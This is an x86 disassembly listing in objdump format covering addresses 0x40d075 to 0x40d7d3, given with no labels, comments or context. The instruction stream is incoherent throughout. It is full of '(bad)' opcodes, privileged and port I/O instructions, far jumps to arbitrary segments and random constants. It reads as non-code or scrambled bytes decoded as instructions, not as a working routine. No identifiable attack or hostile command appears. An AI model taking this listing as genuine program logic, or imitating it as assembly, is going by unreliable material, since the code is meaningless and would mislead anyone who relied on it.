  40d075:	sub    bh,BYTE PTR [esp+ebx*2]
  40d078:	mov    cl,0x29
  40d07a:	and    eax,0x52fa49ce
  40d07f:	inc    ecx
  40d080:	and    al,0x35
  40d082:	pop    edi
  40d083:	jb     0x40d028
  40d085:	adc    al,0xd5
  40d087:	inc    ecx
  40d088:	mov    ecx,0x26b9df6f
  40d08d:	sbb    DWORD PTR [esi],ecx
  40d08f:	sbb    DWORD PTR [edi],0x22f5119
  40d095:	scas   al,BYTE PTR es:[edi]
  40d096:	leave  
  40d097:	pop    edi
  40d098:	pop    ebp
  40d099:	sbb    DWORD PTR [edx+0x65],0xd4c2dd85
  40d0a0:	ss daa 
  40d0a2:	ret    0x8657
  40d0a5:	mov    al,ds:0x997cdde2
  40d0aa:	call   0x4a0d875e
  40d0af:	ss loop 0x40d0bb
  40d0b2:	imul   ebp,esp,0x4a3978f9
  40d0b8:	sti    
  40d0b9:	(bad)
  40d0bd:	mov    ebp,0xe3549db9
  40d0c2:	and    eax,esp
  40d0c4:	cli    
  40d0c5:	stc    
  40d0c6:	(bad)
  40d0c9:	sbb    eax,0x1fea404e
  40d0ce:	ret    0xe77e
  40d0d1:	jne    0x40d09b
  40d0d3:	test   BYTE PTR [eax+0x30],bl
  40d0d6:	adc    DWORD PTR [eax+0x6],eax
  40d0d9:	ret    0x83ad
  40d0dc:	sub    ah,cl
  40d0de:	(bad)  
  40d0df:	and    ah,BYTE PTR [esp+edi*1-0x16ce103a]
  40d0e6:	loop   0x40d143
  40d0e8:	das    
  40d0e9:	adc    edi,edi
  40d0eb:	test   DWORD PTR [eax-0x5adc16a2],0xa73f2645
  40d0f5:	loop   0x40d123
  40d0f7:	leave  
  40d0f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0f9:	div    DWORD PTR ds:0x59cf52b8
  40d0ff:	dec    edx
  40d100:	and    esi,edi
  40d102:	push   esp
  40d103:	xchg   edx,eax
  40d104:	sub    dl,BYTE PTR ds:0x39bf6a86
  40d10a:	mov    ch,0x62
  40d10c:	pop    ecx
  40d10d:	cs cld 
  40d10f:	(bad)  
  40d111:	sar    edi,0xa3
  40d114:	add    al,0xb
  40d116:	xor    BYTE PTR [ecx+0x15],bl
  40d119:	dec    edi
  40d11a:	or     eax,0x9d1b22eb
  40d11f:	cmp    edx,DWORD PTR [edi]
  40d121:	pop    edi
  40d122:	aaa    
  40d123:	inc    esi
  40d124:	add    DWORD PTR [ebx+eax*1+0xa79f7fc],ebx
  40d12b:	pop    esi
  40d12c:	mov    ebx,0x516aff01
  40d131:	retf   
  40d132:	(bad)  
  40d133:	xor    al,0xde
  40d135:	das    
  40d136:	jmp    0x2534:0xff12bdef
  40d13d:	pop    eax
  40d13e:	xor    al,BYTE PTR [ebp+0x34]
  40d141:	fist   DWORD PTR [edx+esi*8]
  40d144:	in     al,dx
  40d145:	xchg   ebx,eax
  40d146:	cmp    BYTE PTR [eax+edi*4+0x26],bl
  40d14a:	mov    eax,ds:0xfd278bf5
  40d14f:	in     al,dx
  40d150:	cmp    bl,ah
  40d152:	xchg   ebx,eax
  40d153:	cs inc ebx
  40d155:	adc    ebp,DWORD PTR [edi]
  40d157:	xchg   ecx,eax
  40d158:	mov    al,ds:0xb3527144
  40d15d:	hlt    
  40d15e:	mov    dh,0x60
  40d160:	inc    ecx
  40d161:	add    dl,BYTE PTR [edx]
  40d163:	jg     0x40d17c
  40d165:	mov    esp,0x555a54df
  40d16a:	mov    esi,ebp
  40d16c:	sar    BYTE PTR [eax],1
  40d16e:	ja     0x40d192
  40d170:	adc    BYTE PTR [edx+esi*1],dh
  40d173:	fs daa 
  40d175:	sbb    DWORD PTR [edi],ecx
  40d177:	je     0x40d1a2
  40d179:	arpl   WORD PTR [ebx+esi*4-0x2a1fdb0],ax
  40d180:	es cmp edi,ebp
  40d183:	push   edi
  40d184:	arpl   WORD PTR [esi+0x7],si
  40d187:	pusha  
  40d188:	adc    ah,BYTE PTR [ebp+0x63ee012c]
  40d18e:	mov    ?,WORD PTR [ebp-0x73]
  40d191:	sub    DWORD PTR [edi+eax*8+0x449ac57d],edi
  40d198:	repnz mov ?,WORD PTR ds:0x751f2f9
  40d19f:	addr16 inc edx
  40d1a1:	cli    
  40d1a2:	mov    BYTE PTR [edi],ch
  40d1a4:	bound  ebx,QWORD PTR [esi+0x110bfa97]
  40d1aa:	and    DWORD PTR [eax+0x67],esp
  40d1ad:	push   edx
  40d1ae:	mov    al,ds:0x9c0e9dd
  40d1b3:	cmc    
  40d1b4:	(bad)  
  40d1b6:	stc    
  40d1b7:	call   0x943bda20
  40d1bc:	retf   
  40d1bd:	mov    DWORD PTR [edi+ebx*1],eax
  40d1c0:	mov    DWORD PTR [ebx+0x5c0dad15],0xcd5e444
  40d1ca:	jno    0x40d1a4
  40d1cc:	sub    dl,ch
  40d1ce:	xor    al,0xc0
  40d1d0:	sub    edx,DWORD PTR [ebp+0x241d6bb5]
  40d1d6:	and    DWORD PTR [ebp+0x73],edx
  40d1d9:	jne    0x40d1e1
  40d1db:	mov    al,BYTE PTR [edi-0x1]
  40d1de:	mov    cl,0x87
  40d1e0:	arpl   ax,di
  40d1e2:	out    dx,al
  40d1e3:	test   BYTE PTR [ecx],0x7e
  40d1e6:	stos   DWORD PTR es:[edi],eax
  40d1e7:	sti    
  40d1e8:	cmc    
  40d1e9:	mov    ds:0x506521d5,eax
  40d1ee:	push   edx
  40d1ef:	and    ebp,DWORD PTR [edx-0x36c85356]
  40d1f5:	xchg   edx,eax
  40d1f6:	mov    ah,0x3f
  40d1f8:	push   edi
  40d1f9:	ins    BYTE PTR es:[edi],dx
  40d1fa:	sti    
  40d1fb:	test   al,0x4
  40d1fd:	scas   al,BYTE PTR es:[edi]
  40d1fe:	(bad)  
  40d1ff:	dec    esp
  40d200:	cwde   
  40d201:	add    BYTE PTR [ebx+0x26],ch
  40d204:	rcr    BYTE PTR [ebx],1
  40d206:	xlat   BYTE PTR ds:[ebx]
  40d207:	mov    ?,ecx
  40d209:	es int 0x5
  40d20c:	xchg   edi,edi
  40d20e:	int    0x28
  40d210:	mov    eax,ds:0x4acdc20c
  40d215:	outs   dx,DWORD PTR ds:[esi]
  40d216:	jmp    0x1b07a038
  40d21b:	dec    edx
  40d21c:	(bad)  
  40d21d:	adc    BYTE PTR [ebx],bh
  40d21f:	rcl    DWORD PTR [esi],1
  40d221:	shr    al,cl
  40d223:	lods   eax,DWORD PTR ds:[esi]
  40d224:	mov    BYTE PTR [ebp+0x310147fe],ch
  40d22a:	xchg   ebx,ecx
  40d22c:	loopne 0x40d20a
  40d22e:	pusha  
  40d22f:	push   esp
  40d230:	loopne 0x40d29f
  40d232:	cmp    eax,0x8ca3dbd2
  40d237:	int    0x19
  40d239:	add    eax,0x974c0e84
  40d23e:	icebp  
  40d23f:	aas    
  40d240:	div    BYTE PTR [edx-0x17]
  40d243:	adc    BYTE PTR [ebx+0x6b8aaae4],dh
  40d249:	jp     0x40d27e
  40d24b:	fldcw  WORD PTR [eax]
  40d24d:	mov    dh,0x1
  40d24f:	es adc eax,0xce7b84cd
  40d255:	std    
  40d256:	sbb    al,0xed
  40d258:	push   ecx
  40d259:	sub    eax,0x39c82f37
  40d25e:	dec    ebx
  40d25f:	jp     0x40d246
  40d261:	sbb    eax,0xa962bb64
  40d266:	pusha  
  40d267:	dec    esi
  40d268:	mov    ?,WORD PTR [eax]
  40d26a:	mov    edx,0x1c6cc3d3
  40d26f:	inc    ebx
  40d270:	xchg   ecx,eax
  40d271:	out    dx,al
  40d272:	mov    bh,0x6e
  40d274:	bndldx (bad),[ebx]
  40d277:	das    
  40d278:	inc    esi
  40d279:	cmp    bh,BYTE PTR [eax-0x69d8ccf7]
  40d27f:	popa   
  40d280:	(bad)  
  40d281:	xor    eax,0x32ab0d50
  40d286:	mov    edi,0x4ccc73de
  40d28b:	cmp    DWORD PTR [edi],edx
  40d28d:	pop    ds
  40d28e:	cdq    
  40d28f:	push   ds
  40d290:	mov    cs,WORD PTR [eax]
  40d292:	sti    
  40d293:	ss test al,0x7
  40d296:	xchg   esp,eax
  40d297:	imul   ebp,DWORD PTR [edi],0xffffff8b
  40d29a:	xor    esi,DWORD PTR [edi]
  40d29c:	scas   eax,DWORD PTR es:[edi]
  40d29d:	(bad)  
  40d29e:	dec    esi
  40d29f:	popa   
  40d2a0:	sub    BYTE PTR [esi+0x77e87e8c],ah
  40d2a6:	je     0x40d299
  40d2a8:	out    0x79,al
  40d2aa:	clc    
  40d2ab:	mov    edi,0x8c399550
  40d2b0:	push   esi
  40d2b1:	xchg   BYTE PTR [edi-0x52],al
  40d2b4:	jno    0x40d30f
  40d2b6:	cdq    
  40d2b7:	int3   
  40d2b8:	inc    ecx
  40d2b9:	lods   al,BYTE PTR ds:[esi]
  40d2ba:	push   edi
  40d2bb:	loop   0x40d292
  40d2bd:	rep lods eax,DWORD PTR ds:[esi]
  40d2bf:	ja     0x40d24f
  40d2c1:	fdivr  QWORD PTR [ecx+0x4bf2beda]
  40d2c7:	pop    ebp
  40d2c8:	sbb    al,0x52
  40d2ca:	in     al,dx
  40d2cb:	xchg   esp,eax
  40d2cc:	ins    DWORD PTR es:[edi],dx
  40d2cd:	shl    DWORD PTR ds:[ebx+0x4a],1
  40d2d1:	jecxz  0x40d310
  40d2d3:	into   
  40d2d4:	jg     0x40d2c8
  40d2d6:	push   esi
  40d2d7:	add    DWORD PTR [ebp-0x6716d1d1],0xf61a66a9
  40d2e1:	ret    0x1a65
  40d2e4:	addr16 cmp esi,esi
  40d2e7:	push   esp
  40d2e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2e9:	push   eax
  40d2ea:	sahf   
  40d2eb:	in     al,0x72
  40d2ed:	add    eax,0xce97e930
  40d2f2:	and    BYTE PTR [edx-0xe881d89],al
  40d2f8:	push   esp
  40d2f9:	xor    DWORD PTR [eax],esp
  40d2fb:	repz out 0xe1,al
  40d2fe:	icebp  
  40d2ff:	(bad)  [edx+0x51b238d3]
  40d305:	(bad)  
  40d306:	pop    edi
  40d307:	out    0x7d,al
  40d309:	inc    bl
  40d30b:	sti    
  40d30c:	mov    edi,0xdafba145
  40d311:	push   0xffffff85
  40d313:	xor    esp,DWORD PTR [eax]
  40d315:	xchg   BYTE PTR [esi],ch
  40d317:	rol    DWORD PTR [ebx+0x50],0x11
  40d31b:	jae    0x40d365
  40d31d:	aas    
  40d31e:	sahf   
  40d31f:	cld    
  40d320:	stos   DWORD PTR es:[edi],eax
  40d321:	in     eax,0x2e
  40d323:	sahf   
  40d324:	pop    edi
  40d325:	sbb    DWORD PTR [eax],ebp
  40d327:	mov    edx,0x711dc45d
  40d32c:	jge    0x40d3aa
  40d32e:	mov    ah,0xd6
  40d330:	addr16 and bl,ch
  40d333:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d334:	pop    ecx
  40d335:	hlt    
  40d336:	lahf   
  40d337:	xchg   edi,eax
  40d338:	call   0x28a:0x386309b6
  40d33f:	adc    ecx,ebx
  40d341:	aad    0x19
  40d343:	or     esp,esi
  40d345:	sub    BYTE PTR [edi-0x4b],al
  40d348:	jg     0x40d318
  40d34a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d34b:	mov    ah,BYTE PTR [ecx]
  40d34d:	mov    ch,0xbf
  40d34f:	add    al,0xe5
  40d351:	lods   al,BYTE PTR ds:[esi]
  40d352:	ror    DWORD PTR [ebp+0x303ba291],1
  40d358:	sti    
  40d359:	mov    ebx,0x740d2ef8
  40d35e:	inc    ebx
  40d35f:	ss out 0xc3,al
  40d362:	push   esp
  40d363:	into   
  40d364:	xor    BYTE PTR [esi],bl
  40d366:	xor    BYTE PTR [ebx+0x1f],bl
  40d369:	pop    esi
  40d36a:	sbb    dl,BYTE PTR [ecx]
  40d36c:	mov    dl,BYTE PTR ds:0xf9dbee53
  40d372:	mov    bh,al
  40d374:	xor    eax,0xf98387c3
  40d379:	es and al,0x8d
  40d37c:	push   ss
  40d37d:	adc    BYTE PTR [ecx+0x25],ah
  40d380:	cld    
  40d381:	mov    bh,0xc5
  40d383:	rol    DWORD PTR [edx-0x5fa6cc71],cl
  40d389:	stos   DWORD PTR es:[edi],eax
  40d38a:	pop    es
  40d38b:	xchg   ebp,eax
  40d38c:	xchg   edi,ebp
  40d38e:	test   eax,0xca20f61e
  40d393:	std    
  40d394:	adc    BYTE PTR es:[ebx-0x17388de5],0x99
  40d39c:	nop
  40d39d:	push   esp
  40d39e:	shl    esi,0x74
  40d3a1:	push   cs
  40d3a2:	xchg   ch,ch
  40d3a4:	xor    al,0x7a
  40d3a6:	mov    al,0x2d
  40d3a8:	xchg   edi,eax
  40d3a9:	dec    ebp
  40d3aa:	fimul  WORD PTR ds:0x2a3c3520
  40d3b0:	jo     0x40d344
  40d3b2:	pusha  
  40d3b3:	push   eax
  40d3b4:	cwde   
  40d3b5:	fs call 0x24d9:0xe5e51e75
  40d3bd:	xor    eax,0x4ec26b75
  40d3c2:	ja     0x40d3f8
  40d3c4:	jno    0x40d383
  40d3c6:	adc    DWORD PTR [edi-0x74],edi
  40d3c9:	jae    0x40d3a6
  40d3cb:	lea    esp,[esi+0x745c9d0e]
  40d3d1:	sbb    cl,ch
  40d3d3:	sahf   
  40d3d4:	jno    0x40d373
  40d3d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3d7:	push   ds
  40d3d8:	sub    ch,cl
  40d3da:	cmp    edi,eax
  40d3dc:	cmp    DWORD PTR [edi],ebx
  40d3de:	cwde   
  40d3df:	sbb    eax,0x852cafa8
  40d3e4:	mov    dl,0xb0
  40d3e6:	adc    bh,BYTE PTR [edi]
  40d3e8:	fs sahf 
  40d3ea:	das    
  40d3eb:	hlt    
  40d3ec:	adc    eax,ebx
  40d3ee:	test   al,0x36
  40d3f0:	addr16 dec ebp
  40d3f2:	lock push 0x6cf5a319
  40d3f8:	cmp    BYTE PTR [esi+ebp*4+0x14],bl
  40d3fc:	test   al,0xf1
  40d3fe:	es push edi
  40d400:	mov    eax,0xd73af8de
  40d405:	jp     0x40d38c
  40d407:	in     eax,0xf
  40d409:	mov    cl,0xc3
  40d40b:	outs   dx,BYTE PTR ds:[esi]
  40d40c:	dec    edi
  40d40d:	idiv   DWORD PTR [eax-0x4e]
  40d410:	jbe    0x40d40e
  40d412:	add    BYTE PTR [ebx+0x46],al
  40d415:	push   ss
  40d416:	mov    bh,0x85
  40d418:	out    dx,al
  40d419:	jmp    0x1d57288e
  40d41e:	fldenv ds:0x14adf9ca
  40d424:	inc    ebx
  40d425:	je     0x40d495
  40d427:	inc    eax
  40d428:	pop    esp
  40d429:	(bad)  
  40d42a:	sbb    al,0xd9
  40d42c:	mov    eax,ds:0x7bcd8f7e
  40d431:	arpl   WORD PTR [edi*1+0x48be0ee9],ax
  40d438:	pusha  
  40d439:	mov    ch,0x43
  40d43b:	loop   0x40d47a
  40d43d:	push   ebx
  40d43e:	fs inc edi
  40d440:	xlat   BYTE PTR ds:[ebx]
  40d441:	xchg   DWORD PTR [ebx+edx*8-0x44ceaaea],esp
  40d448:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d449:	mov    ds:0x88737b60,eax
  40d44e:	or     BYTE PTR [ecx+0x7e],dl
  40d451:	mov    esp,0x2df5cf60
  40d456:	cmp    eax,0xad0df307
  40d45b:	sbb    bl,BYTE PTR [edi+0x11]
  40d45e:	loopne 0x40d467
  40d460:	mov    edx,esi
  40d462:	mov    al,0x3a
  40d464:	jl     0x40d3ed
  40d466:	std    
  40d467:	inc    edi
  40d468:	test   DWORD PTR [ebx],eax
  40d46a:	sbb    al,0xe1
  40d46c:	add    al,0xf8
  40d46e:	sub    eax,0xe412abb5
  40d473:	icebp  
  40d474:	pminub mm1,QWORD PTR [edi+0x46]
  40d478:	inc    esi
  40d479:	fild   DWORD PTR [ebx-0x7238c0fa]
  40d47f:	in     al,dx
  40d480:	in     eax,0x8e
  40d482:	jmp    0xc26f:0xf505d43e
  40d489:	and    eax,0x32d902ba
  40d48e:	stos   DWORD PTR es:[edi],eax
  40d48f:	test   eax,0x9f7dba16
  40d494:	or     al,0xf3
  40d496:	adc    eax,0x93d7d620
  40d49b:	mov    al,BYTE PTR [ebx]
  40d49d:	sbb    ch,BYTE PTR [eax-0x53cb45c]
  40d4a3:	fdivr  DWORD PTR [edx+0x400cef7d]
  40d4a9:	imul   ebp,DWORD PTR [edi+0x2a279b83],0xffffff95
  40d4b0:	aad    0x44
  40d4b2:	js     0x40d47a
  40d4b4:	dec    ecx
  40d4b5:	aam    0x8
  40d4b7:	xchg   ebp,eax
  40d4b8:	jmp    0x40d4f8
  40d4ba:	sub    eax,0x8b57bb49
  40d4bf:	xchg   ebx,eax
  40d4c0:	inc    edi
  40d4c1:	and    ch,ah
  40d4c3:	sbb    eax,ebp
  40d4c5:	aaa    
  40d4c6:	popa   
  40d4c7:	sahf   
  40d4c8:	sub    BYTE PTR [ebp-0x3c648aa3],0x9c
  40d4cf:	jg     0x40d4eb
  40d4d1:	add    BYTE PTR [edi-0x1f],bh
  40d4d4:	sahf   
  40d4d5:	stos   BYTE PTR es:[edi],al
  40d4d6:	shr    DWORD PTR [esi+0x24317be8],1
  40d4dc:	scas   eax,DWORD PTR es:[edi]
  40d4dd:	xchg   edx,eax
  40d4de:	jns    0x40d53b
  40d4e0:	sub    al,0x9a
  40d4e2:	aas    
  40d4e3:	jmp    0x40d4c2
  40d4e5:	jns    0x40d472
  40d4e7:	(bad)  
  40d4e8:	jmp    0x1356e4d2
  40d4ed:	div    DWORD PTR [ebx]
  40d4ef:	inc    eax
  40d4f0:	cmp    al,0x36
  40d4f2:	(bad)  
  40d4f3:	adc    al,0x32
  40d4f5:	sbb    DWORD PTR [edi-0x647b7cec],0x77
  40d4fc:	and    al,0xf3
  40d4fe:	pop    esi
  40d4ff:	xor    al,0x7
  40d501:	lock sub BYTE PTR [ebp-0x6b],al
  40d505:	gs ja  0x40d515
  40d508:	jle    0x40d55d
  40d50a:	pop    esp
  40d50b:	fcomp  DWORD PTR [edx-0x1c81991a]
  40d511:	call   0xa947fdb1
  40d516:	or     ah,BYTE PTR [esi+0x32ae0f1f]
  40d51c:	daa    
  40d51d:	jae    0x40d576
  40d51f:	in     eax,dx
  40d520:	jno    0x40d4c0
  40d522:	push   esi
  40d523:	bound  edi,QWORD PTR [ecx+0x7eb471ae]
  40d529:	sub    ch,al
  40d52b:	mov    edi,0x18a98e1f
  40d530:	sbb    BYTE PTR [esi],0xc8
  40d533:	inc    edi
  40d534:	add    BYTE PTR [ebx-0x563105c],dl
  40d53a:	mov    al,ds:0xd7d54e06
  40d53f:	cdq    
  40d540:	add    eax,0x5fe0d30
  40d545:	and    ecx,DWORD PTR [esi]
  40d547:	mov    bh,0x76
  40d549:	adc    ah,BYTE PTR [ebx-0x11]
  40d54c:	mov    ah,0x86
  40d54e:	iret   
  40d54f:	loopne 0x40d586
  40d551:	inc    eax
  40d552:	test   al,0x16
  40d554:	cmc    
  40d555:	jg     0x40d54f
  40d557:	inc    ebx
  40d558:	aam    0xb5
  40d55a:	(bad)  
  40d55b:	dec    ecx
  40d55c:	sub    bl,BYTE PTR [edi]
  40d55e:	pop    esi
  40d55f:	mov    dl,0xaf
  40d561:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d562:	jnp    0x40d4fe
  40d564:	pop    esi
  40d565:	fcmovnu st,st(5)
  40d567:	mov    ebx,0xb18c8d06
  40d56c:	inc    eax
  40d56d:	(bad)  
  40d56e:	ja     0x40d5ad
  40d570:	test   eax,0x2dd5cc91
  40d575:	in     eax,dx
  40d576:	ja     0x40d5c9
  40d578:	mov    ecx,0x48f87817
  40d57d:	push   edx
  40d57e:	push   esi
  40d57f:	js     0x40d585
  40d581:	inc    edx
  40d582:	outs   dx,BYTE PTR ds:[esi]
  40d583:	mov    bh,0x4
  40d585:	push   esi
  40d586:	pop    ebp
  40d587:	ins    BYTE PTR es:[edi],dx
  40d588:	retf   
  40d589:	pop    edx
  40d58a:	pop    ecx
  40d58b:	cld    
  40d58c:	ins    BYTE PTR es:[edi],dx
  40d58d:	in     eax,0x6a
  40d58f:	out    0x44,eax
  40d591:	jns    0x40d5dd
  40d593:	xchg   ebx,eax
  40d594:	not    BYTE PTR [esi-0x3500b29b]
  40d59a:	and    ch,bl
  40d59c:	test   DWORD PTR [esi+0x59],ebp
  40d59f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5a0:	xor    eax,0xcb126fd2
  40d5a5:	push   0x33
  40d5a7:	mov    esp,ebp
  40d5a9:	xor    ebx,ecx
  40d5ab:	(bad)  
  40d5ad:	pop    edx
  40d5ae:	xor    al,BYTE PTR [ebp+0x39842ce1]
  40d5b4:	mov    eax,ds:0xa38f9e22
  40d5b9:	xor    ah,dh
  40d5bb:	js     0x40d57d
  40d5bd:	xchg   esi,eax
  40d5be:	pop    ds
  40d5bf:	mov    edx,0x9ef1914e
  40d5c4:	xchg   edi,eax
  40d5c5:	mov    ebx,0x315ce6fc
  40d5ca:	aad    0xa8
  40d5cc:	test   al,0xbd
  40d5ce:	pop    esp
  40d5cf:	mov    al,ds:0x17fc2b42
  40d5d4:	loop   0x40d5b9
  40d5d6:	scas   al,BYTE PTR es:[edi]
  40d5d7:	nop
  40d5d8:	(bad)  
  40d5d9:	and    eax,0x3268d39e
  40d5de:	xchg   ebp,eax
  40d5df:	dec    esp
  40d5e0:	loope  0x40d572
  40d5e2:	fwait
  40d5e3:	aad    0x9
  40d5e5:	jmp    0x40d632
  40d5e7:	sahf   
  40d5e8:	je     0x40d631
  40d5ea:	xor    esp,DWORD PTR [edx-0x4a]
  40d5ed:	jb     0x40d589
  40d5ef:	cmp    ecx,DWORD PTR [esi]
  40d5f1:	into   
  40d5f2:	mov    al,ds:0x74d4ba9c
  40d5f7:	mov    edx,DWORD PTR [edx+ebp*1]
  40d5fa:	mov    ds:0x65b39618,al
  40d5ff:	pusha  
  40d600:	add    al,0x26
  40d602:	jne    0x40d646
  40d604:	scas   eax,DWORD PTR es:[edi]
  40d605:	mov    al,ds:0xa2027a7b
  40d60a:	sti    
  40d60b:	sti    
  40d60c:	cmp    BYTE PTR [ecx-0x2e],dh
  40d60f:	adc    dl,dl
  40d611:	lahf   
  40d612:	mov    DWORD PTR [edx],ebx
  40d614:	adc    ch,BYTE PTR [edi+0x22]
  40d617:	out    dx,eax
  40d618:	cmp    DWORD PTR [ecx+0x17],esp
  40d61b:	cmp    dh,BYTE PTR [ebp-0x587a00e3]
  40d621:	clc    
  40d622:	(bad)  
  40d623:	push   cs
  40d624:	push   esi
  40d625:	shr    BYTE PTR [edx+edx*4+0x58],1
  40d629:	push   ss
  40d62a:	pop    ebp
  40d62b:	int3   
  40d62c:	jnp    0x40d63b
  40d62e:	scas   al,BYTE PTR es:[edi]
  40d62f:	pop    eax
  40d630:	mov    db6,edi
  40d633:	test   cl,dh
  40d635:	fwait
  40d636:	int    0xdd
  40d638:	pop    es
  40d639:	in     eax,dx
  40d63a:	jbe    0x40d5f5
  40d63c:	sub    BYTE PTR [esi],bh
  40d63e:	pop    eax
  40d63f:	cdq    
  40d640:	sub    ecx,DWORD PTR [edi]
  40d642:	pop    esp
  40d643:	addr16 push ecx
  40d645:	(bad)  
  40d646:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d647:	and    eax,0xe9d91ccf
  40d64c:	hlt    
  40d64d:	jb     0x40d5db
  40d64f:	xor    BYTE PTR ds:0xada8347d,cl
  40d655:	jne    0x40d65c
  40d657:	mov    edx,0xe89d8207
  40d65c:	rol    BYTE PTR [ecx+0x12],0x1f
  40d660:	inc    eax
  40d661:	out    0xd4,al
  40d663:	mov    WORD PTR [ecx+ecx*8],?
  40d666:	cmp    ecx,DWORD PTR [eax+0x14]
  40d669:	jbe    0x40d62a
  40d66b:	cld    
  40d66c:	mov    ch,0xf4
  40d66e:	shr    DWORD PTR ds:0xd91820c9,cl
  40d674:	xor    al,0xbd
  40d676:	push   0x31092e48
  40d67b:	adc    ah,BYTE PTR [eax+0x44ab8d07]
  40d681:	dec    eax
  40d682:	sub    bl,BYTE PTR [ebx-0x71]
  40d685:	nop
  40d686:	sub    ecx,DWORD PTR [ecx]
  40d688:	bound  esi,QWORD PTR [ecx+eax*8]
  40d68b:	dec    edi
  40d68c:	or     BYTE PTR [edx-0x11],bl
  40d68f:	adc    dl,cl
  40d691:	inc    ecx
  40d692:	jle    0x40d6eb
  40d694:	clc    
  40d695:	shl    ebx,cl
  40d697:	pop    ecx
  40d698:	pusha  
  40d699:	call   0x9e91:0xd6a3083a
  40d6a0:	adc    esi,DWORD PTR [ebx+0x59fb0aa]
  40d6a6:	sbb    ebx,DWORD PTR [edi]
  40d6a8:	imul   ebp,DWORD PTR [ebx-0x12b6fba7],0x32
  40d6af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6b0:	xor    eax,0x21215679
  40d6b5:	cwde   
  40d6b6:	jmp    0xbcca:0xa263be
  40d6bd:	xchg   esi,eax
  40d6be:	dec    edx
  40d6bf:	xchg   BYTE PTR ds:[ebp-0x22],bl
  40d6c3:	fwait
  40d6c4:	pop    eax
  40d6c5:	stos   DWORD PTR es:[edi],eax
  40d6c6:	push   cs
  40d6c7:	shl    BYTE PTR [edx-0x33],0x51
  40d6cb:	stc    
  40d6cc:	dec    eax
  40d6cd:	(bad)  
  40d6ce:	cmc    
  40d6cf:	mov    ecx,0x28fb903
  40d6d4:	mov    ds:0xe81846b0,eax
  40d6d9:	outs   dx,BYTE PTR ds:[esi]
  40d6da:	and    ebp,DWORD PTR [esi-0x6a]
  40d6dd:	loopne 0x40d680
  40d6df:	mov    esi,0xa6c533b5
  40d6e4:	pushf  
  40d6e5:	pop    ss
  40d6e6:	dec    ebx
  40d6e7:	stos   BYTE PTR es:[edi],al
  40d6e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6e9:	mov    ebp,0xdd710b88
  40d6ee:	push   esp
  40d6ef:	je     0x40d729
  40d6f1:	shr    BYTE PTR ds:0xe3b8bac0,cl
  40d6f7:	fistp  DWORD PTR [edx+0x9598ce0]
  40d6fd:	mov    bh,0x84
  40d6ff:	ja     0x40d71e
  40d701:	push   eax
  40d702:	loop   0x40d6c7
  40d704:	cmc    
  40d705:	cmc    
  40d706:	inc    esp
  40d707:	out    dx,al
  40d708:	and    al,0xa0
  40d70a:	loopne 0x40d756
  40d70c:	inc    esp
  40d70d:	xor    DWORD PTR [ebx],ecx
  40d70f:	or     eax,0xdcbf155e
  40d714:	fbstp  TBYTE PTR [ecx+0xb46cb3]
  40d71a:	psrld  mm4,QWORD PTR [edi-0x18309c47]
  40d721:	or     al,0x2f
  40d723:	inc    esp
  40d724:	fld    st(2)
  40d726:	and    cl,cl
  40d728:	adc    al,BYTE PTR [edx+0x54aac1b2]
  40d72e:	xchg   edi,eax
  40d72f:	sbb    ebx,DWORD PTR [edx]
  40d731:	stos   DWORD PTR es:[edi],eax
  40d732:	in     eax,dx
  40d733:	test   eax,0x2167116f
  40d738:	adc    BYTE PTR [edx],dh
  40d73a:	pop    esi
  40d73b:	iret   
  40d73c:	cwde   
  40d73d:	test   esi,0xfc290f50
  40d743:	stos   BYTE PTR es:[edi],al
  40d744:	aad    0xa8
  40d746:	shl    BYTE PTR [edx+0x71c0dfb3],cl
  40d74c:	mov    DWORD PTR [esi],ebx
  40d74e:	push   eax
  40d74f:	out    dx,al
  40d750:	push   ss
  40d751:	push   edi
  40d752:	dec    edx
  40d753:	cli    
  40d754:	rcl    BYTE PTR [ebp-0x5c69ef2c],1
  40d75a:	dec    ecx
  40d75b:	push   cs
  40d75c:	mov    ecx,0xcc44612e
  40d761:	call   0x438d154b
  40d766:	ficomp DWORD PTR [esi]
  40d768:	fs repnz adc al,0x18
  40d76c:	or     al,0x91
  40d76e:	add    ebp,DWORD PTR [ebx]
  40d770:	lea    ecx,[ebp-0x37c9e7ff]
  40d776:	jmp    0x4174:0x8311aaf5
  40d77d:	stos   DWORD PTR es:[edi],eax
  40d77e:	ins    DWORD PTR es:[edi],dx
  40d77f:	stos   DWORD PTR es:[edi],eax
  40d780:	clc    
  40d781:	(bad)  
  40d782:	fwait
  40d783:	sub    al,0x8a
  40d785:	imul   edi,DWORD PTR [ecx-0x4],0x12eb8858
  40d78c:	mov    ds:0x8c5898df,eax
  40d791:	ja     0x40d805
  40d793:	test   eax,0x3e980115
  40d798:	(bad)  
  40d799:	aam    0x7c
  40d79b:	xchg   edx,eax
  40d79c:	les    esi,FWORD PTR [ecx]
  40d79e:	pop    ss
  40d79f:	push   0x35
  40d7a1:	ja     0x40d78c
  40d7a3:	ja     0x40d779
  40d7a5:	fisttp DWORD PTR [esi]
  40d7a7:	jmp    DWORD PTR [ebp-0x25]
  40d7aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7ab:	ffreep st(7)
  40d7ad:	pop    ebp
  40d7ae:	jns    0x40d76b
  40d7b0:	xchg   edi,eax
  40d7b1:	stos   DWORD PTR es:[edi],eax
  40d7b2:	cmp    ebx,ebp
  40d7b4:	push   edi
  40d7b5:	xchg   ebp,eax
  40d7b6:	and    dl,BYTE PTR [eax+0x146bd2]
  40d7bc:	inc    edx
  40d7bd:	call   0x4087e9f3
  40d7c2:	fxch   st(5)
  40d7c4:	push   ss
  40d7c5:	lods   eax,DWORD PTR ds:[esi]
  40d7c6:	int    0x4
  40d7c8:	sbb    al,0x4f
  40d7ca:	popa   
  40d7cb:	retf   0xe358
  40d7ce:	sbb    eax,0x9250cd53
  40d7d3:	mov    dl,0xfc
